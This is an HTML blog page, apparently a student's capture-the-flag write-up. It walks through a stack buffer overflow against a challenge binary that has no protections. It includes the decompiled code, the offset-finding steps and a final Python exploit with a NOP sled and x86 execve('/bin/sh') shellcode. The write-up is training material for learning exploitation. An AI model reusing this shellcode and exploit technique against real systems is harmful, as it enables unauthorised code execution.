<!doctype html>
<html lang="en-us">
  <head>
    <title>Shell Code // R1x0n</title>
    <link rel="stylesheet" type="text/css" href="/static/css/style.css">
    <link rel="shortcut icon" href="/favicon.ico" />
      <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">


    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.80.0" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="John Doe" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="https://r1x0n.github.io/site/css/main.min.9c85f19995f193906921ead51ce6b5a58faf690a7b6863c50a4d0c487f7f94e5.css" />

    
    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Shell Code"/>
<meta name="twitter:description" content="Goal of the exercise Have a shell and print the contents of the flag file.
Research And Reverse Engineering Test See if there are any protections: I see it with &ldquo;checksec&rdquo; command:
Apparently the program has no protection. What the program uses: I see it with &ldquo;ltrace&rdquo; command: I want to know more about &ldquo;puts&rdquo; and &ldquo;read&rdquo;: Decompiled C code: main():
int __cdecl main(int argc, const char **argv, const char **envp) { setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); puts( &#34; _________."/>

    <meta property="og:title" content="Shell Code" />
<meta property="og:description" content="Goal of the exercise Have a shell and print the contents of the flag file.
Research And Reverse Engineering Test See if there are any protections: I see it with &ldquo;checksec&rdquo; command:
Apparently the program has no protection. What the program uses: I see it with &ldquo;ltrace&rdquo; command: I want to know more about &ldquo;puts&rdquo; and &ldquo;read&rdquo;: Decompiled C code: main():
int __cdecl main(int argc, const char **argv, const char **envp) { setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); puts( &#34; _________." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://r1x0n.github.io/site/pages/cyber-challenge/shell-code/" />
<meta property="article:published_time" content="2021-12-02T11:44:31+01:00" />
<meta property="article:modified_time" content="2021-12-02T11:44:31+01:00" />


  </head>
  <body>

    <header class="app-header"id="particles-js">
      <a href="https://r1x0n.github.io/site/"><img class="app-header-avatar" src="/site/avatar.jpg" alt="John Doe" /></a>
      <h1>R1x0n</h1>
      <nav class="app-header-menu">
          <a class="app-header-menu-item" href="/site/certifications/">Certifications</a>
             - 
          
          <a class="app-header-menu-item" href="/site/tags/">Tags</a>
      </nav>
      
      <p>üë∂üèΩ : 1998, Lugano CH <br>üìç: Lugano CH</p>



      

      
        <script src='https://cldup.com/S6Ptkwu_qA.js'></script><script  src="static/utils/script.js"></script>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
	    <h1 class ="post-title">Shell Code	
	      
	      <img src="" class="logo">
      </h1>
    </header>
    <div class="post-content">
      <h2 id="goal-of-the-exercise">Goal of the exercise</h2>
<p>Have a shell and print the contents of the flag file.</p>
<h2 id="research-and-reverse-engineering-test">Research And Reverse Engineering Test</h2>
<h3 id="see-if-there-are-any-protections">See if there are any protections:</h3>
<p>I see it with &ldquo;checksec&rdquo; command:</p>
<img src="/posts/cyber-challenge/static/shell-checksec.png" width="70%" height="70%" align="center" class="center">
Apparently the program has no protection.
<h3 id="what-the-program-uses">What the program uses:</h3>
<p>I see it with &ldquo;ltrace&rdquo; command:
<img src="/posts/cyber-challenge/static/shell-ltrace.png" width="70%" height="70%" align="center" class="center"></p>
<p>I want to know more about &ldquo;puts&rdquo; and &ldquo;read&rdquo;:
<img src="/posts/cyber-challenge/static/shell-puts.png" width="70%" height="70%" align="center" class="center"></p>
<img src="/posts/cyber-challenge/static/shell-read.png" width="70%" height="70%" align="center" class="center">
<h2 id="decompiled-c-code">Decompiled C code:</h2>
<p>main():</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
{
  setvbuf(stdin, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>);
  setvbuf(stdout, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>);
  puts(
    <span style="color:#e6db74">&#34;  _________.__           .__  .__                   .___      </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
    <span style="color:#e6db74">&#34; /   _____/|  |__   ____ |  | |  |   ____  ____   __| _/____  </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
    <span style="color:#e6db74">&#34; </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">_____  </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74"> |  |  </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">_/ __ </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">|  | |  | _/ ___</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">/  _ </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74"> / __ |/ __ </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
    <span style="color:#e6db74">&#34; /        </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">|   Y  </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">  ___/|  |_|  |_</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">  </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">__(  &lt;_&gt; ) /_/ </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">  ___/ </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
    <span style="color:#e6db74">&#34;/_______  /|___|  /</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">___  &gt;____/____/</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">___  &gt;____/</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">____ |</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">___  &gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
    <span style="color:#e6db74">&#34;        </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">/      </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">/     </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">/               </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">/           </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">/    </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">/ </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
  prog();
  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>prog():</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">prog</span>()
{
  <span style="color:#66d9ef">char</span> v1; <span style="color:#75715e">// [esp+8h] [ebp-3F0h]
</span><span style="color:#75715e"></span>

  get_name(<span style="color:#f92672">&amp;</span>v1);
  <span style="color:#66d9ef">return</span> printf(<span style="color:#e6db74">&#34;Hello Mr.%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">&amp;</span>v1);
}
</code></pre></div><p>The C code has nothing interesting, so I have to write it myself.</p>
<h2 id="actual-analysis-and-exploitation-begins-here">ACTUAL ANALYSIS AND EXPLOITATION BEGINS HERE</h2>
<h3 id="i-need-to-know-if-there-is-space-to-write-a-shellcode">I need to know if there is space to write a shellcode:</h3>
<p>I can see it from the Assembly code to the &ldquo;prog()&rdquo; function:</p>
<img src="/posts/cyber-challenge/static/shell-assembly.png" width="70%" height="70%" align="center" class="center">
The stack is assigned 0x3f8 bytes of space for the variables.
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cereal@killer-VirtualBox:~/Desktop/challenge/l0ngl0ng$ ipython
Python 2.7.12 <span style="color:#f92672">(</span>default, Nov <span style="color:#ae81ff">12</span> 2018, 14:36:49<span style="color:#f92672">)</span> 
Type <span style="color:#e6db74">&#34;copyright&#34;</span>, <span style="color:#e6db74">&#34;credits&#34;</span> or <span style="color:#e6db74">&#34;license&#34;</span> <span style="color:#66d9ef">for</span> more information.


IPython 2.4.1 -- An enhanced Interactive Python.
?         -&gt; Introduction and overview of IPython<span style="color:#e6db74">&#39;s features.
</span><span style="color:#e6db74">%quickref -&gt; Quick reference.
</span><span style="color:#e6db74">help      -&gt; Python&#39;</span>s own help system.
object?   -&gt; Details about <span style="color:#e6db74">&#39;object&#39;</span>, use <span style="color:#e6db74">&#39;object??&#39;</span> <span style="color:#66d9ef">for</span> extra details.


In <span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>: 0x3f8
Out<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>: <span style="color:#ae81ff">1016</span>
</code></pre></div><p>So 1016 bytes, It&rsquo;s definitely enough space.</p>
<h3 id="i-need-to-know-if-i-can-take-control-of-the-return-address">I need to know if I can take control of the return address:</h3>
<p>I can make it with a ‚ÄúCyclic‚Äù string:</p>
<img src="/posts/cyber-challenge/static/shell-string.png" width="70%" height="70%" align="center" class="center">
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cereal@killer-VirtualBox:~/Desktop/challenge/shellcode$ cyclic -l 0x6b616164
<span style="color:#ae81ff">1012</span>
</code></pre></div><p>The cyclic query confirms that the return address has been overwritten with part of my string. Exactly after 1012 bytes (or characters).
I can write a small script to test it:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> struct<span style="color:#f92672">,</span> sys

junk <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">1012</span>
jmp_address <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;I&#34;</span>, <span style="color:#ae81ff">0x41414141</span>)
payload <span style="color:#f92672">=</span> junk<span style="color:#f92672">+</span>jmp_address
<span style="color:#66d9ef">print</span>(payload)
</code></pre></div><p>Result:</p>
<img src="/posts/cyber-challenge/static/shell-test.png" width="70%" height="70%" align="center" class="center">
EIP its perfectly overwritten with "41414141". This confirms that there are 1012 bytes first.
### I need to know where I start writing in memory:
With a breakpoint immediately after my input, I can see the memory layout:
<img src="/posts/cyber-challenge/static/shell-memory.png" width="70%" height="70%" align="center" class="center">
Now in know that I start writing in these addresses, one of the first will be fine.
## Final exploit writing
x.py:
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> struct<span style="color:#f92672">,</span> sys

nope <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">900</span>
nope2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">89</span>
shell <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">#23bytes</span>
jmp_address <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;I&#34;</span>, <span style="color:#ae81ff">0xffffcd60</span>)

payload <span style="color:#f92672">=</span> nope<span style="color:#f92672">+</span>shell<span style="color:#f92672">+</span>nope2<span style="color:#f92672">+</span>jmp_address
<span style="color:#66d9ef">print</span>(payload)
sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>flush()
</code></pre></div><h3 id="script-analysis">Script analysis:</h3>
<ul>
<li>900 &ldquo;nop&rdquo;, to slide the program to the beginning of the shell code</li>
<li>The shell code</li>
<li>90 &ldquo;nop&rdquo; between shell code and return address</li>
<li>The return address</li>
</ul>
<p>In this way, I first added some code to my liking and later made sure the program jumps in it!
Result:</p>
<img src="/posts/cyber-challenge/static/shell-result.png" width="70%" height="70%" align="center" class="center">

    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
